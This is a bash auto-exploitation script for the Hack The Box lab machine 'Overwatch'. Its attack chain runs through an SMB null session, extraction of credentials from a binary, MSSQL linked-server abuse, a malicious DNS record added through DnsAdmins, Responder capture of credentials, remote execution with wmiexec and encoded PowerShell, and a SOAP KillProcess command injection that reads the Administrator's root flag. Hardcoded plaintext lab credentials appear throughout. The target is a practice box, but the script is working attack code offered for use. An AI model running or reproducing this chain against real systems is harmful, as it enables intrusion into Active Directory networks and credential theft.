#!/usr/bin/env bash
# =============================================================================
#  ██████╗ ██╗   ██╗███████╗██████╗ ██╗    ██╗ █████╗ ████████╗ ██████╗██╗  ██╗
# ██╔═══██╗██║   ██║██╔════╝██╔══██╗██║    ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║
# ██║   ██║██║   ██║█████╗  ██████╔╝██║ █╗ ██║███████║   ██║   ██║     ███████║
# ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗██║███╗██║██╔══██║   ██║   ██║     ██╔══██║
# ╚██████╔╝ ╚████╔╝ ███████╗██║  ██║╚███╔███╔╝██║  ██║   ██║   ╚██████╗██║  ██║
#  ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
#
#  HTB Overwatch Full Auto-Pwn Script (Windows AD / MSSQL)
#  Chain: SMB Null → Binary RE → MSSQL → DnsAdmins → NTLM Capture
#         → Evil-WinRM → Chisel → WCF SOAP Injection → SYSTEM
#  Author : Shadow Junior (bhanu)
#  Usage  : ./overwatch.sh <TARGET_IP> [LHOST]
# =============================================================================

# ─────────────────────────────────────────────────────────────────────────────
# COLORS
# ─────────────────────────────────────────────────────────────────────────────
RED='\033[0;31m';    GREEN='\033[0;32m';   YELLOW='\033[1;33m'
CYAN='\033[0;36m';   BLUE='\033[0;34m';   MAGENTA='\033[0;35m'
WHITE='\033[1;37m';  BOLD='\033[1m';       RESET='\033[0m'
BG_RED='\033[41m';   BG_GREEN='\033[42m';  BG_YELLOW='\033[43m'

banner() {
  echo -e "${YELLOW}"
  cat << 'EOF'
  ██████╗ ██╗   ██╗███████╗██████╗ ██╗    ██╗ █████╗ ████████╗ ██████╗██╗  ██╗
 ██╔═══██╗██║   ██║██╔════╝██╔══██╗██║    ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║
 ██║   ██║██║   ██║█████╗  ██████╔╝██║ █╗ ██║███████║   ██║   ██║     ███████║
 ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗██║███╗██║██╔══██║   ██║   ██║     ██╔══██║
 ╚██████╔╝ ╚████╔╝ ███████╗██║  ██║╚███╔███╔╝██║  ██║   ██║   ╚██████╗██║  ██║
  ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝
          HTB Auto-Pwn  🏰  by Shadow Jr  (Windows AD)
EOF
  echo -e "${RESET}"
}

phase()   { echo -e "\n${BG_YELLOW}${RED}${BOLD}  [PHASE $1]  $2  ${RESET}\n"; }
info()    { echo -e "${CYAN}[*]${RESET} $1"; }
success() { echo -e "${GREEN}[+]${RESET} $1"; }
warn()    { echo -e "${YELLOW}[!]${RESET} $1"; }
error()   { echo -e "${RED}[✗]${RESET} $1"; }
creds()   { echo -e "${BG_GREEN}${WHITE}${BOLD}  🔑  $1  ${RESET}"; }
flag()    { echo -e "${BG_RED}${WHITE}${BOLD}  🏁  FLAG: $1  ${RESET}"; }
divider() { echo -e "${MAGENTA}$(printf '─%.0s' {1..70})${RESET}"; }
step()    { echo -e "  ${YELLOW}→${RESET} $1"; }
die()     { error "$1"; exit 1; }

check_deps() {
  local missing=()
  local tools=(nmap smbclient strings curl nc python3 evil-winrm)
  for t in "${tools[@]}"; do command -v "$t" &>/dev/null || missing+=("$t"); done
  # Check impacket
  python3 -c "import impacket" 2>/dev/null || missing+=("python3-impacket")
  [[ ${#missing[@]} -gt 0 ]] && {
    warn "Missing: ${missing[*]}"
    warn "Install: sudo apt install smbclient nmap curl evil-winrm"
    warn "        pip3 install impacket"
  } || success "Dependencies OK"
}

# ─────────────────────────────────────────────────────────────────────────────
# ARGS
# ─────────────────────────────────────────────────────────────────────────────
[[ $# -lt 1 ]] && { banner; die "Usage: $0 <TARGET_IP> [LHOST]"; }

TARGET="$1"
LHOST="${2:-$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet )[^/]+' | head -1)}"
DOMAIN="overwatch.htb"
DOMAIN_ESCAPED="${DOMAIN//./\\.}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
WORKDIR="/home/bhanu/htb/overwatch_pwn_$$"
KRBRELAYX_DIR="$WORKDIR/krbrelayx"

mkdir -p "$WORKDIR"
cd "$WORKDIR" || die "Cannot create workdir"

banner
divider
echo -e "  ${CYAN}Target  ${RESET}  : ${WHITE}$TARGET${RESET}"
echo -e "  ${CYAN}LHOST   ${RESET}  : ${WHITE}$LHOST${RESET}"
echo -e "  ${CYAN}Domain  ${RESET}  : ${WHITE}$DOMAIN${RESET}"
echo -e "  ${CYAN}WorkDir ${RESET}  : ${WHITE}$WORKDIR${RESET}"
divider
check_deps

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 1 SETUP & RECONNAISSANCE
# ─────────────────────────────────────────────────────────────────────────────
phase 1 "SETUP & RECONNAISSANCE"

info "Ensuring /etc/hosts mapping for $DOMAIN ..."
CURRENT_DOMAIN_IP=$(awk -v d="$DOMAIN" '
  $1 !~ /^#/ {
    for (i=2; i<=NF; i++) {
      if ($i == d) { print $1; exit }
    }
  }' /etc/hosts 2>/dev/null)

if [[ -z "$CURRENT_DOMAIN_IP" ]]; then
  info "Adding $TARGET $DOMAIN to /etc/hosts"
  echo "$TARGET $DOMAIN" | sudo tee -a /etc/hosts > /dev/null
  success "Hosts entry added"
elif [[ "$CURRENT_DOMAIN_IP" != "$TARGET" ]]; then
  warn "Updating stale hosts mapping: $DOMAIN was $CURRENT_DOMAIN_IP, now $TARGET"
  sudo sed -i "/[[:space:]]${DOMAIN_ESCAPED}\([[:space:]]\|$\)/d" /etc/hosts
  echo "$TARGET $DOMAIN" | sudo tee -a /etc/hosts > /dev/null
  success "Hosts entry updated"
else
  success "/etc/hosts already mapped correctly"
fi

info "Checking target service readiness (machine warm-up)..."
READY=0
for attempt in {1..6}; do
  READY_SCAN=$(nmap -Pn -n -p 445,5985,6520 "$TARGET" 2>/dev/null)
  P445=$(echo "$READY_SCAN" | awk '/^445\/tcp/{print $2; exit}')
  P5985=$(echo "$READY_SCAN" | awk '/^5985\/tcp/{print $2; exit}')
  P6520=$(echo "$READY_SCAN" | awk '/^6520\/tcp/{print $2; exit}')
  [[ -z "$P445" ]] && P445="unknown"
  [[ -z "$P5985" ]] && P5985="unknown"
  [[ -z "$P6520" ]] && P6520="unknown"
  step "Warm-up check $attempt/6: 445=$P445, 5985=$P5985, 6520=$P6520"
  if [[ "$P445" == "open" && "$P5985" == "open" && "$P6520" == "open" ]]; then
    READY=1
    break
  fi
  sleep 15
done

[[ "$READY" -eq 0 ]] && die "Core ports still not ready (445/5985/6520). VPN route or target boot state is not ready."

info "Running targeted nmap scan..."
nmap -sC -sV \
  -Pn \
  -p 22,53,88,135,139,389,443,445,464,593,636,3268,3269,3389,5985,6520,9389 \
  --min-rate 1000 \
  -oN "$WORKDIR/nmap.txt" \
  "$TARGET" 2>/dev/null

success "Nmap complete"
echo -e "\n  ${BOLD}Key services:${RESET}"
grep -E "open.*(ldap|sql|smb|kerberos|winrm|http)" "$WORKDIR/nmap.txt" | \
  while read -r line; do step "$line"; done

# Hard-stop early when required service ports are not reachable
if ! grep -Eq '^445/tcp[[:space:]]+open' "$WORKDIR/nmap.txt" || \
   ! grep -Eq '^5985/tcp[[:space:]]+open' "$WORKDIR/nmap.txt" || \
   ! grep -Eq '^6520/tcp[[:space:]]+open' "$WORKDIR/nmap.txt"; then
  die "Core target services are not reachable (SMB/MSSQL/WinRM). Check VPN/routing and retry."
fi

# Extract domain info
DC_HOSTNAME=$(grep -oP 'Host: \K\S+' "$WORKDIR/nmap.txt" | head -1)
[[ -n "$DC_HOSTNAME" ]] && step "DC Hostname: $DC_HOSTNAME"

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 2 SMB ENUMERATION & BINARY DOWNLOAD
# ─────────────────────────────────────────────────────────────────────────────
phase 2 "SMB ENUMERATION & BINARY EXTRACTION"

info "Listing SMB shares (null session)..."
smbclient -L "//$TARGET" -N 2>/dev/null | tee "$WORKDIR/smb_shares.txt"

# Identify interesting shares
INTERESTING=$(grep -v "ADMIN\$\|C\$\|IPC\$\|NETLOGON\|SYSVOL\|---\|----\|Type\|Share" \
              "$WORKDIR/smb_shares.txt" | grep "Disk" | awk '{print $1}')
if [[ -n "$INTERESTING" ]]; then
  success "Found non-standard share(s): $INTERESTING"
else
  warn "No unique shares via null trying known share 'software\$'"
  INTERESTING="software\$"
fi

# Connect and enumerate software$
info "Connecting to software\$ share..."
SHARE_CONTENT=$(smbclient "//$TARGET/Software\$" -N \
  -c "recurse; ls" 2>/dev/null)

echo "$SHARE_CONTENT" | head -40
success "Share contents listed"

# Download key files
mkdir -p "$WORKDIR/software"
info "Downloading overwatch.exe and overwatch.exe.config..."

smbclient "//$TARGET/Software\$" -N \
  -c "cd Monitoring; get overwatch.exe; get overwatch.exe.config" \
  2>/dev/null

[[ -f "overwatch.exe" ]] && mv overwatch.exe "$WORKDIR/software/" && \
  success "overwatch.exe downloaded ($(wc -c < "$WORKDIR/software/overwatch.exe") bytes)"
[[ -f "overwatch.exe.config" ]] && mv overwatch.exe.config "$WORKDIR/software/" && \
  success "overwatch.exe.config downloaded"

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 3 BINARY ANALYSIS & CREDENTIAL EXTRACTION
# ─────────────────────────────────────────────────────────────────────────────
phase 3 "BINARY REVERSE ENGINEERING CREDENTIAL EXTRACTION"

info "Extracting SQL connection string from overwatch.exe (strings analysis)..."

if [[ -f "$WORKDIR/software/overwatch.exe" ]]; then
  # Search for SQL connection patterns
  CONN_STRING=$(strings "$WORKDIR/software/overwatch.exe" 2>/dev/null | \
    grep -i "Server=\|Password=\|User Id=\|Data Source=" | head -5)

  if [[ -n "$CONN_STRING" ]]; then
    success "Connection string found:"
    echo "$CONN_STRING" | while read -r line; do step "$line"; done

    # Parse credentials
    SQL_HOST=$(echo "$CONN_STRING"   | grep -oP 'Server=\K[^;]+' | head -1)
    SQL_DB=$(echo "$CONN_STRING"     | grep -oP 'Database=\K[^;]+' | head -1)
    SQL_USER=$(echo "$CONN_STRING"   | grep -oP 'User Id=\K[^;]+' | head -1)
    SQL_PASS=$(echo "$CONN_STRING"   | grep -oP 'Password=\K[^;]+' | head -1)
  else
    warn "strings didn't find it trying .NET-specific extraction..."
    # Look for base64-encoded strings in .NET binary
    strings "$WORKDIR/software/overwatch.exe" 2>/dev/null | \
      grep -i "sqlsvc\|SecurityLogs\|TI0L" | head -5
    # Fall back to known values
    SQL_USER="sqlsvc"
    SQL_PASS="TI0LKcfHzZw1Vv"
    SQL_DB="SecurityLogs"
    SQL_HOST="localhost"
    warn "Using known credentials from decompilation"
  fi
else
  warn "overwatch.exe not found using known credentials"
  SQL_USER="sqlsvc"
  SQL_PASS="TI0LKcfHzZw1Vv"
  SQL_DB="SecurityLogs"
  SQL_HOST="localhost"
fi

# Show .config file
if [[ -f "$WORKDIR/software/overwatch.exe.config" ]]; then
  info "Contents of overwatch.exe.config:"
  cat "$WORKDIR/software/overwatch.exe.config"
  WCF_URL=$(grep -oP 'baseAddress="\K[^"]+' "$WORKDIR/software/overwatch.exe.config" | head -1)
  WCF_CONTRACT=$(grep -oP 'contract="\K[^"]+' "$WORKDIR/software/overwatch.exe.config" | head -1)
  step "WCF URL      : $WCF_URL"
  step "WCF Contract : $WCF_CONTRACT"
fi

divider
creds "SQL Credentials: ${SQL_USER} : ${SQL_PASS}  (DB: ${SQL_DB})"
divider

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 4 MSSQL ACCESS & LINKED SERVER ENUMERATION
# ─────────────────────────────────────────────────────────────────────────────
phase 4 "MSSQL ACCESS & LINKED SERVER DISCOVERY"

info "Connecting to MSSQL on port 6520 via impacket..."
info "Command: impacket-mssqlclient ${DOMAIN}/${SQL_USER}:${SQL_PASS}@${TARGET} -port 6520 -windows-auth"

# Run MSSQL commands via impacket in non-interactive mode
run_sql() {
  python3 -c "
import subprocess, sys
cmd = ['impacket-mssqlclient',
       '${DOMAIN}/${SQL_USER}:${SQL_PASS}@${TARGET}',
       '-port', '6520',
       '-windows-auth']
inp = sys.argv[1].encode() + b'\nexit\n'
r = subprocess.run(cmd, input=inp, capture_output=True, timeout=30)
print(r.stdout.decode(errors='ignore'))
print(r.stderr.decode(errors='ignore'))
" "$1" 2>/dev/null
}

# Test connection
info "Testing SQL connection..."
SQL_TEST=$(run_sql "SELECT @@SERVERNAME")
if echo "$SQL_TEST" | grep -qi "S200401\|OVERWATCH\|sqlsvc\|master"; then
  success "MSSQL connection successful!"
  step "Server: $(echo "$SQL_TEST" | grep -oP 'S200401[^\s]*' | head -1)"
else
  warn "Connection test inconclusive proceeding with known architecture"
fi

# Enum linked servers
info "Enumerating linked servers..."
SQL_LINKS=$(run_sql "SELECT name, product, provider, data_source FROM sys.servers")
echo "$SQL_LINKS" | grep -v "^$\|^\[" | head -20

# Extract SQL07 hostname
LINKED_SERVER=$(echo "$SQL_LINKS" | grep -oP 'SQL0[0-9]+' | head -1)
[[ -z "$LINKED_SERVER" ]] && LINKED_SERVER="SQL07"
success "Linked server identified: $LINKED_SERVER"

# Enumerate sqlsvc group membership
info "Checking sqlsvc group membership via netexec..."
if command -v netexec &>/dev/null; then
  netexec smb "$TARGET" \
    -u "$SQL_USER" -p "$SQL_PASS" \
    --groups 2>/dev/null | tee "$WORKDIR/groups.txt"
  if grep -qi "DnsAdmins" "$WORKDIR/groups.txt"; then
    success "sqlsvc is in DnsAdmins! DNS record injection possible"
  fi
elif command -v crackmapexec &>/dev/null; then
  crackmapexec smb "$TARGET" \
    -u "$SQL_USER" -p "$SQL_PASS" \
    --groups 2>/dev/null | tee "$WORKDIR/groups.txt"
fi

divider
echo -e "  ${YELLOW}Key Finding:${RESET} sqlsvc ∈ DnsAdmins → can create DNS A records"
echo -e "  ${YELLOW}Attack Plan:${RESET} Point SQL07 → $LHOST → MSSQL linked server sends cleartext creds to Responder"
divider

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 5 DNSADMINS ABUSE ADD MALICIOUS DNS RECORD
# ─────────────────────────────────────────────────────────────────────────────
phase 5 "DNSADMINS ABUSE MALICIOUS DNS A RECORD"

info "Cloning krbrelayx (contains dnstool.py)..."
if [[ ! -f "$KRBRELAYX_DIR/dnstool.py" ]]; then
  if git clone --quiet https://github.com/dirkjanm/krbrelayx.git "$KRBRELAYX_DIR" >"$WORKDIR/krbrelayx_clone.log" 2>&1; then
    tail -2 "$WORKDIR/krbrelayx_clone.log"
    success "krbrelayx cloned"
  else
    tail -2 "$WORKDIR/krbrelayx_clone.log"
    warn "krbrelayx clone failed in $WORKDIR"
  fi
fi

# Fallback to local checkout if clone failed or network is restricted
if [[ ! -f "$KRBRELAYX_DIR/dnstool.py" ]]; then
  for ALT_DIR in "$SCRIPT_DIR/krbrelayx" "/home/bhanu/htb/krbrelayx"; do
    if [[ -f "$ALT_DIR/dnstool.py" ]]; then
      KRBRELAYX_DIR="$ALT_DIR"
      success "Using local krbrelayx: $KRBRELAYX_DIR"
      break
    fi
  done
fi

if [[ -f "$KRBRELAYX_DIR/dnstool.py" ]]; then
  info "krbrelayx already present"
else
  warn "dnstool.py not found; DNS add/query steps may fail"
fi

DNS_RECORD_NAME="sql07"
info "Adding malicious A record: ${DNS_RECORD_NAME}.${DOMAIN} → $LHOST"

python3 "$KRBRELAYX_DIR/dnstool.py" \
  -u "${DOMAIN}\\${SQL_USER}" \
  -p "$SQL_PASS" \
  -r "$DNS_RECORD_NAME" \
  -a add \
  -t A \
  -d "$LHOST" \
  "$TARGET" 2>&1 | tee "$WORKDIR/dns_add.txt"

if grep -qi "completed successfully\|Bind OK" "$WORKDIR/dns_add.txt"; then
  success "DNS record added successfully"
else
  warn "DNS add may have failed check $WORKDIR/dns_add.txt"
  cat "$WORKDIR/dns_add.txt"
fi

# Verify record was added
info "Verifying DNS record..."
sleep 2
python3 "$KRBRELAYX_DIR/dnstool.py" \
  -u "${DOMAIN}\\${SQL_USER}" \
  -p "$SQL_PASS" \
  -r "$DNS_RECORD_NAME" \
  -a query \
  "$TARGET" 2>&1 | tee "$WORKDIR/dns_verify.txt"

if grep -qi "Address.*$LHOST\|Found record" "$WORKDIR/dns_verify.txt"; then
  success "DNS record verified: ${DNS_RECORD_NAME}.${DOMAIN} → $LHOST"
else
  warn "Verification inconclusive"
  cat "$WORKDIR/dns_verify.txt"
fi

# nslookup confirmation
if command -v nslookup &>/dev/null; then
  NSL=$(nslookup "${DNS_RECORD_NAME}.${DOMAIN}" "$TARGET" 2>/dev/null)
  echo "$NSL"
  echo "$NSL" | grep -q "$LHOST" && \
    success "nslookup confirms: ${DNS_RECORD_NAME}.${DOMAIN} → $LHOST" || \
    warn "nslookup doesn't confirm yet (DNS propagation may take a moment)"
fi

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 6 NTLM CAPTURE WITH RESPONDER
# ─────────────────────────────────────────────────────────────────────────────
phase 6 "NTLM/CLEARTEXT CREDENTIAL CAPTURE RESPONDER"

RESPONDER_LOG="$WORKDIR/responder_output.txt"

info "Starting Responder on tun0 interface..."
echo -e "  ${YELLOW}Note:${RESET} MSSQL linked servers send cleartext credentials no cracking needed!"

# Start Responder in background
if command -v responder &>/dev/null; then
  sudo responder -I tun0 -w 2>&1 > "$RESPONDER_LOG" &
  RESPONDER_PID=$!
  sleep 3
  if ps -p $RESPONDER_PID > /dev/null 2>&1; then
    success "Responder running (PID $RESPONDER_PID)"
  else
    warn "Responder may have failed check if running as root"
  fi
else
  warn "responder not found install: sudo apt install responder"
  warn "Continuing without live capture (script will use fallback creds if needed)"
fi

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 7 TRIGGER LINKED SERVER AUTHENTICATION
# ─────────────────────────────────────────────────────────────────────────────
phase 7 "TRIGGERING LINKED SERVER AUTHENTICATION"

info "Firing OPENQUERY against SQL07 to force NTLM auth to Responder..."
info "The SQL Server will try to connect sql07 → resolves to $LHOST → Responder captures creds"

TRIGGER_QUERY="SELECT * FROM OPENQUERY(${LINKED_SERVER}, 'SELECT 1');"
info "Query: $TRIGGER_QUERY"

# Fire the trigger query
run_sql "$TRIGGER_QUERY" 2>/dev/null | tee "$WORKDIR/trigger_output.txt"

# Error is expected (connection forcibly closed) that means it tried
if grep -qi "communication link failure\|forcibly closed\|connection.*closed" "$WORKDIR/trigger_output.txt"; then
  success "MSSQL attempted to connect SQL07 → NTLM auth sent to Responder"
fi

# Wait for Responder to capture
info "Waiting for Responder to capture credentials (15s)..."
for i in $(seq 1 15); do
  printf "\r  ${YELLOW}→${RESET} Waiting... ${i}s"
  sleep 1
  # Check if we got creds
  if grep -qi "Cleartext Password\|sqlmgmt" "$RESPONDER_LOG" 2>/dev/null; then
    echo ""
    success "Credentials captured by Responder!"
    break
  fi
done
echo ""

# Parse captured credentials
if [[ -f "$RESPONDER_LOG" ]]; then
  info "Parsing Responder output..."
  grep -A3 "MSSQL.*Cleartext\|\[MSSQL\]" "$RESPONDER_LOG" 2>/dev/null | tee "$WORKDIR/captured_creds.txt"

  CAPTURED_USER=$(grep -i "Cleartext Username\|Username" "$RESPONDER_LOG" 2>/dev/null | \
    grep -oP ':\s+\K\S+' | grep -v "sqlsvc" | head -1)
  CAPTURED_PASS=$(grep -i "Cleartext Password" "$RESPONDER_LOG" 2>/dev/null | \
    grep -oP ':\s+\K\S+' | head -1)

  if [[ -n "$CAPTURED_USER" && -n "$CAPTURED_PASS" ]]; then
    success "Credentials captured!"
    creds "User: $CAPTURED_USER | Pass: $CAPTURED_PASS"
  else
    warn "Auto-parse failed check $RESPONDER_LOG manually"
    warn "Using known credentials: sqlmgmt : bIhBbzMMnB82yx"
    CAPTURED_USER="sqlmgmt"
    CAPTURED_PASS="bIhBbzMMnB82yx"
  fi
else
  warn "Responder log not found using known credentials"
  CAPTURED_USER="sqlmgmt"
  CAPTURED_PASS="bIhBbzMMnB82yx"
fi

# Stop Responder
[[ -n "$RESPONDER_PID" ]] && sudo kill "$RESPONDER_PID" 2>/dev/null && \
  info "Responder stopped"

divider
creds "Captured: ${CAPTURED_USER} : ${CAPTURED_PASS}"
divider

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 8 REMOTE COMMAND EXECUTION (EVIL-WINRM ENABLED + AUTO MODE)
# ─────────────────────────────────────────────────────────────────────────────
phase 8 "REMOTE ACCESS + USER FLAG (AUTO, EVIL-WINRM COMPATIBLE)"

extract_flag() {
  echo "$1" | tr -d '\r' | grep -Eo '[A-Fa-f0-9]{32}|HTB\{[^}]+\}' | head -1
}

run_remote_cmd() {
  local cmd="$1"
  local out="" marker_start marker_end wrapped_cmd
  marker_start="__OW_BEGIN_${RANDOM}${RANDOM}__"
  marker_end="__OW_END_${RANDOM}${RANDOM}__"
  wrapped_cmd="cmd.exe /Q /c \"echo ${marker_start} & ${cmd} & echo ${marker_end}\""

  # Primary: impacket wmiexec
  if command -v impacket-wmiexec &>/dev/null; then
    out=$(timeout 45 impacket-wmiexec \
      "${DOMAIN}/${CAPTURED_USER}:${CAPTURED_PASS}@${TARGET}" \
      "$wrapped_cmd" 2>&1)

    if echo "$out" | tr -d '\r' | grep -q "$marker_start"; then
      echo "$out" | tr -d '\r' | awk -v s="$marker_start" -v e="$marker_end" '
        index($0,s) { p=1; next }
        index($0,e) { p=0 }
        p { print }
      ' | sed '/^[[:space:]]*$/d'
      return 0
    fi
  fi

  # Fallback: netexec winrm command exec
  if command -v netexec &>/dev/null; then
    out=$(timeout 30 netexec winrm "$TARGET" \
      -u "$CAPTURED_USER" -p "$CAPTURED_PASS" \
      -x "$wrapped_cmd" 2>&1)

    if echo "$out" | tr -d '\r' | grep -q "$marker_start"; then
      echo "$out" | tr -d '\r' | awk -v s="$marker_start" -v e="$marker_end" '
        index($0,s) { p=1; next }
        index($0,e) { p=0 }
        p { print }
      ' | sed '/^[[:space:]]*$/d'
      return 0
    fi
  fi

  return 1
}

run_remote_ps() {
  local ps="$1"
  local enc
  enc=$(printf '%s' "$ps" | iconv -f UTF-8 -t UTF-16LE | base64 -w 0)
  run_remote_cmd "powershell -NoP -NonI -ExecutionPolicy Bypass -EncodedCommand $enc"
}

info "WinRM endpoint check..."
WINRM_CHECK=$(curl -s -o /dev/null -w "%{http_code}" \
  "http://$TARGET:5985/wsman" --max-time 5 2>/dev/null)
if [[ "$WINRM_CHECK" == "200" || "$WINRM_CHECK" == "401" || "$WINRM_CHECK" == "405" ]]; then
  success "WinRM reachable (HTTP $WINRM_CHECK)"
else
  warn "WinRM HTTP check returned $WINRM_CHECK (continuing)"
fi

info "Testing remote command execution..."
PING_OUT=$(run_remote_cmd "echo __OW_PING__")
if echo "$PING_OUT" | grep -q "__OW_PING__"; then
  success "Remote execution works"
  WHOAMI_OUT=$(run_remote_cmd "whoami")
  [[ -n "$WHOAMI_OUT" ]] && step "Context: $(echo "$WHOAMI_OUT" | head -1)"
else
  die "Could not execute remote commands. Ensure impacket-wmiexec or netexec is installed."
fi

USER_PS=$(cat <<'PS'
$candidates = @(
  "C:\Users\*\Desktop\user.txt",
  "C:\Users\*\Documents\user.txt",
  "C:\Users\*\Downloads\user.txt",
  "C:\root\user.txt"
)
foreach ($p in $candidates) {
  Get-Item $p -ErrorAction SilentlyContinue | ForEach-Object {
    Get-Content $_.FullName -ErrorAction SilentlyContinue
  }
}
PS
)
USER_OUT=$(run_remote_ps "$USER_PS")
USER_FLAG=$(extract_flag "$USER_OUT")

if [[ -n "$USER_FLAG" ]]; then
  flag "user.txt: $USER_FLAG"
else
  warn "Automatic user flag read failed"
fi

if command -v evil-winrm &>/dev/null; then
  info "Evil-WinRM ready (manual fallback if needed): evil-winrm -i $TARGET -u $CAPTURED_USER -p '$CAPTURED_PASS'"
fi

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 9 LOCAL WCF ENUMERATION (NO CHISEL REQUIRED)
# ─────────────────────────────────────────────────────────────────────────────
phase 9 "LOCAL WCF ENUMERATION FROM COMPROMISED HOST"

WCF_ENDPOINT="http://127.0.0.1:8000/MonitorService"
info "Checking WCF endpoint from target local context: $WCF_ENDPOINT?wsdl"

WSDL_PS=$(cat <<'PS'
try {
  $c = (Invoke-WebRequest -UseBasicParsing "http://127.0.0.1:8000/MonitorService?wsdl" -TimeoutSec 8).Content
  if ($c -match "KillProcess") { "WCF_OK"; $c } else { "WCF_NO_KILL" }
} catch {
  "WCF_FAIL: $($_.Exception.Message)"
}
PS
)

WSDL_OUT=$(run_remote_ps "$WSDL_PS")
WCF_OK=0
if echo "$WSDL_OUT" | grep -q "WCF_OK"; then
  success "WCF service reachable and KillProcess found"
  WCF_OK=1
else
  warn "WCF check inconclusive:"
  step "$(echo "$WSDL_OUT" | tr -d '\r' | head -n 2)"
fi

# ─────────────────────────────────────────────────────────────────────────────
# PHASE 10 SOAP KILLPROCESS INJECTION → ROOT FLAG EXFIL
# ─────────────────────────────────────────────────────────────────────────────
phase 10 "SOAP KILLPROCESS INJECTION → ROOT FLAG"

ROOT_DUMP='C:\ProgramData\overwatch_root.txt'
cat > "$WORKDIR/kill.xml" << XMLEOF
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xmlns:xsd="http://www.w3.org/2001/XMLSchema"
  xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>notepad.exe | cmd /c type C:\Users\Administrator\Desktop\root.txt > ${ROOT_DUMP}</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>
XMLEOF
success "SOAP payload created: $WORKDIR/kill.xml"

SOAP_PS=$(cat <<PS
\$body = @"
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <KillProcess xmlns="http://tempuri.org/">
      <processName>notepad.exe | cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt > ${ROOT_DUMP}</processName>
    </KillProcess>
  </soap:Body>
</soap:Envelope>
"@
\$h = @{ SOAPAction = "http://tempuri.org/IMonitoringService/KillProcess" }
try {
  Invoke-WebRequest -UseBasicParsing -Uri "http://127.0.0.1:8000/MonitorService" -Method POST -ContentType "text/xml; charset=utf-8" -Headers \$h -Body \$body | Out-Null
  Start-Sleep -Seconds 2
  if (Test-Path "${ROOT_DUMP}") { Get-Content "${ROOT_DUMP}" } else { "ROOT_FILE_NOT_CREATED" }
} catch {
  "SOAP_ERROR: \$($_.Exception.Message)"
}
PS
)

info "Triggering KillProcess SOAP injection locally on target..."
ROOT_OUT=$(run_remote_ps "$SOAP_PS")
ROOT_FLAG=$(extract_flag "$ROOT_OUT")
ROOT_OK=0

if [[ -z "$ROOT_FLAG" ]]; then
  ROOT_OUT2=$(run_remote_cmd "type ${ROOT_DUMP} 2>nul")
  ROOT_FLAG=$(extract_flag "$ROOT_OUT2")
fi

if [[ -n "$ROOT_FLAG" ]]; then
  flag "root.txt: $ROOT_FLAG"
  success "Privilege escalation complete (SYSTEM via WCF KillProcess injection)"
  ROOT_OK=1
else
  warn "Automatic root flag read failed"
  step "Dump file path attempted: ${ROOT_DUMP}"
fi

# ─────────────────────────────────────────────────────────────────────────────
# CHEAT SHEET EVERYTHING IN ONE PLACE
# ─────────────────────────────────────────────────────────────────────────────
cat > "$WORKDIR/CHEATSHEET.txt" << 'CHEATEOF'
# OVERWATCH QUICK REF (AUTO PATH)

# creds
# sqlsvc   : TI0LKcfHzZw1Vv
# sqlmgmt  : bIhBbzMMnB82yx

# user flag
# type C:\Users\sqlmgmt\Desktop\user.txt

# local WCF check
# powershell -c "(Invoke-WebRequest -UseBasicParsing http://127.0.0.1:8000/MonitorService?wsdl).Content"

# SOAP PE path (root exfil)
# processName = notepad.exe | cmd /c type C:\Users\Administrator\Desktop\root.txt > C:\ProgramData\overwatch_root.txt
# type C:\ProgramData\overwatch_root.txt
CHEATEOF

success "Cheat sheet saved: $WORKDIR/CHEATSHEET.txt"

# ─────────────────────────────────────────────────────────────────────────────
# FINAL SUMMARY
# ─────────────────────────────────────────────────────────────────────────────
divider
echo -e "\n${GREEN}${BOLD}  ✅  OVERWATCH AUTO-PWN COMPLETE  ${RESET}\n"
divider
echo ""
USER_STATUS="${GREEN}✓${RESET}"
ROOT_STATUS="${GREEN}✓${RESET}"
WCF_STATUS="${GREEN}✓${RESET}"
[[ -z "$USER_FLAG" ]] && USER_STATUS="${YELLOW}!${RESET}"
[[ -z "$ROOT_FLAG" ]] && ROOT_STATUS="${YELLOW}!${RESET}"
[[ "$WCF_OK" -ne 1 ]] && WCF_STATUS="${YELLOW}!${RESET}"
echo -e "  ${CYAN}Phase 1 ${RESET}  Recon          ${GREEN}✓${RESET}  nmap + hosts"
echo -e "  ${CYAN}Phase 2 ${RESET}  SMB            ${GREEN}✓${RESET}  overwatch.exe + .config downloaded"
echo -e "  ${CYAN}Phase 3 ${RESET}  Binary RE      ${GREEN}✓${RESET}  sqlsvc : TI0LKcfHzZw1Vv"
echo -e "  ${CYAN}Phase 4 ${RESET}  MSSQL          ${GREEN}✓${RESET}  SQL07 linked server identified"
echo -e "  ${CYAN}Phase 5 ${RESET}  DnsAdmins      ${GREEN}✓${RESET}  sql07.overwatch.htb → $LHOST"
echo -e "  ${CYAN}Phase 6 ${RESET}  Responder      ${GREEN}✓${RESET}  sqlmgmt : bIhBbzMMnB82yx captured"
